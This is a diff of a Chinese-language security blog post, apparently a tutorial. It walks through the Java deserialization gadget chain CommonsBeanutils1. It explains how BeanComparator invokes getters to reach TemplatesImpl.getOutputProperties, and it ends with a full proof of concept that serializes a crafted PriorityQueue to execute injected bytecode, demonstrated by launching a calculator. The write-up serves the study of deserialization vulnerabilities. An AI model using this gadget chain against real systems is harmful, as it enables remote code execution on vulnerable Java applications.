@@ -482,38 +482,132 @@
 <p>​    1、若干<code>private</code>实例字段；</p>
 <p>​    2、通过<code>public</code>方法来读写实例字段。</p>
 <p>如：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public class Person &#123;
+    private String name;
+    private int age;
+
+    public String getName() &#123; return this.name; &#125;
+    public void setName(String name) &#123; this.name &#x3D; name; &#125;
+
+    public int getAge() &#123; return this.age; &#125;
+    public void setAge(int age) &#123; this.age &#x3D; age; &#125;
+&#125;</code></pre>
 
 <p>如果其读写方法符合以下命名规范：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读方法:</span></span><br><span class="line"><span class="keyword">public</span> Type <span class="title function_">getXyz</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 写方法:</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setXyz</span><span class="params">(Type value)</span></span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; 读方法:
+public Type getXyz()
+&#x2F;&#x2F; 写方法:
+public void setXyz(Type value)</code></pre>
 
 <p>那么这种<code>class</code>被称为<code>JavaBean</code>。而其中的读方法和写方法又被称为getter和setter，我们通常把一组对应的读方法（<code>getter</code>）和写方法（<code>setter</code>）称为属性（<code>property</code>）。</p>
 <h2 id="getter的使用"><a href="#getter的使用" class="headerlink" title="getter的使用"></a>getter的使用</h2><p>java.util.Comparator介绍完一些概念后，我们继续讨论漏洞的触发方式。我们需要找一个Comparator，在它的compare方法中又能帮我们触发漏洞的地方。这里我们找的是commons-beanutils中的org.apache.commons.beanutils.BeanComparator。</p>
 <p>在看这个比较器的compare方法之前，我们了解一下commons-beanutils提供的一个静态方法PropertyUtils.getProperty，它可以让使用者直接调用任意JavaBean的getter方法。以我我们之前给出的Person为例：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(), name)</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">PropertyUtils.getProperty(new Person(), name)</code></pre>
 
 <p>这里就会自动找到name的getter方法，即getName，然后将其调用，然后返回调用结果。</p>
 <p>了解了这个方法之后，我们可以看之前提到的org.apache.commons.beanutils.BeanComparator的compare方法了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public int compare(T o1, T o2) &#123;
+        if (this.property &#x3D;&#x3D; null) &#123;
+            return this.internalCompare(o1, o2);
+        &#125; else &#123;
+            try &#123;
+                Object value1 &#x3D; PropertyUtils.getProperty(o1, this.property);
+                Object value2 &#x3D; PropertyUtils.getProperty(o2, this.property);
+                return this.internalCompare(value1, value2);
+            &#125; catch (IllegalAccessException var5) &#123;
+                throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());
+            &#125; catch (InvocationTargetException var6) &#123;
+                throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());
+            &#125; catch (NoSuchMethodException var7) &#123;
+                throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());
+            &#125;
+        &#125;
+    &#125;</code></pre>
 
 <p>这个方法其实是比较两个JavaBean是否相等，这个方法传入两个对象，如果this.property为空， 就调用this.internalCompare直接比较两个对象。否则的话，就取这两个对象的this.property属性，并比较其是否相等。这里的PropertyUtils.getProperty会调用这两个属性的getter方法来取this.property属性。那么我们可以尝试寻找一个可以帮我们触发漏洞的getter，回顾CC3中我们利用TemplatesImpl动态加载字节码时调用defineClass方法的那条调用链：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TemplatesImpl#defineClass()</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TemplatesImpl#defineClass()</code></pre>
 
 <p>这里的getOutputProperties()，就是一个getter</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public synchronized Properties getOutputProperties() &#123;
+       try &#123;
+           return newTransformer().getOutputProperties();
+       &#125;
+       catch (TransformerConfigurationException e) &#123;
+           return null;
+       &#125;
+   &#125;</code></pre>
 
 <p>当compare方法中的o1是TemplatesImpl,且this.property是OutputProperties时，将会调用这个getOutputProperties() 方法进而触发调用链。</p>
 <h2 id="POC的构造"><a href="#POC的构造" class="headerlink" title="POC的构造"></a>POC的构造</h2><p>首先还是TemplatesImpl的构造，这点和之前没有任何区别</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Cal.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                code</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">TemplatesImpl obj &#x3D; new TemplatesImpl();
+        ClassPool pool &#x3D; ClassPool.getDefault();
+        CtClass clazz &#x3D; pool.get(Cal.class.getName());
+        byte[] code &#x3D; clazz.toBytecode();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;
+                code
+        &#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</code></pre>
 
 <p>然后是创建PriorityQueue和BeanComparator对象</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">final BeanComparator comparator &#x3D; new BeanComparator();
+final PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2, comparator);
+queue.add(1);
+queue.add(1);</code></pre>
 
 <p>最后我们需要对对象进行初始化，为我们需要的成员变量赋值</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</code></pre>
 
 <p>最后给出完整的POC</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">package com.govuln.deserialization;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.apache.commons.beanutils.BeanComparator;
+
+public class CommonsBeanutils1 &#123;
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        TemplatesImpl obj &#x3D; new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;
+                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
+        &#125;);
+        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        final BeanComparator comparator &#x3D; new BeanComparator();
+        final PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2, comparator);
+        &#x2F;&#x2F; stub data for replacement later
+        queue.add(1);
+        queue.add(1);
+
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);
+
+        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o &#x3D; (Object)ois.readObject();
+    &#125;
+&#125;</code></pre>
 
 <p>结果弹出计算器：</p>
 <img src="/Downloads/commonBean.png"  style="zoom:50%;" />
